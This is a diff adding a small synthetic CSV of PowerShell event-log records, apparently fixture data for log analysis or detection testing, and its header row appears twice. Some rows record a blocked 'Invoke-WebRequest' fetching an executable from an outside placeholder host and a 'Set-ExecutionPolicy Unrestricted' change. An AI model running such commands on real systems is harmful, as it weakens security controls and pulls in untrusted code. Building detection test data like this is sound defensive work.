@@ -1,0 +1,17 @@
+timestamp,event_id,user,computer,script_name,command_line,result
+timestamp,event_id,user,computer,script_name,command_line,result
+"2025-11-16 17:08:48",400,"DOMAIN\jdoe",WS-001,Get-Process.ps1,"Get-Process -Name explorer",Success
+"2025-11-16 18:08:48",403,"DOMAIN\asmith",WS-001,ScriptBlock,"Invoke-WebRequest http://external.com/file.exe",Blocked
+"2025-11-16 19:08:48",600,"WS-001\admin",WS-001,NULL,"Set-ExecutionPolicy Unrestricted",Success
+"2025-11-16 20:08:48",800,"DOMAIN\jdoe",WS-001,Start-Process.ps1,"Start-Process notepad.exe",Failure
+"2025-11-16 21:08:48",400,"DOMAIN\asmith",WS-001,Get-Process.ps1,"Get-Process -Name explorer",Success
+"2025-11-16 22:08:48",403,"WS-001\admin",WS-001,ScriptBlock,"Invoke-WebRequest http://external.com/file.exe",Blocked
+"2025-11-16 23:08:48",600,"DOMAIN\jdoe",WS-001,NULL,"Set-ExecutionPolicy Unrestricted",Success
+"2025-11-17 00:08:48",800,"DOMAIN\asmith",WS-001,Start-Process.ps1,"Start-Process notepad.exe",Failure
+"2025-11-17 01:08:48",400,"WS-001\admin",WS-001,Get-Process.ps1,"Get-Process -Name explorer",Success
+"2025-11-17 02:08:48",403,"DOMAIN\jdoe",WS-001,ScriptBlock,"Invoke-WebRequest http://external.com/file.exe",Blocked
+"2025-11-17 03:08:48",600,"DOMAIN\asmith",WS-001,NULL,"Set-ExecutionPolicy Unrestricted",Success
+"2025-11-17 04:08:48",800,"WS-001\admin",WS-001,Start-Process.ps1,"Start-Process notepad.exe",Failure
+"2025-11-17 05:08:48",400,"DOMAIN\jdoe",WS-001,Get-Process.ps1,"Get-Process -Name explorer",Success
+"2025-11-17 06:08:48",403,"DOMAIN\asmith",WS-001,ScriptBlock,"Invoke-WebRequest http://external.com/file.exe",Blocked
+"2025-11-17 07:08:48",600,"WS-001\admin",WS-001,NULL,"Set-ExecutionPolicy Unrestricted",Success
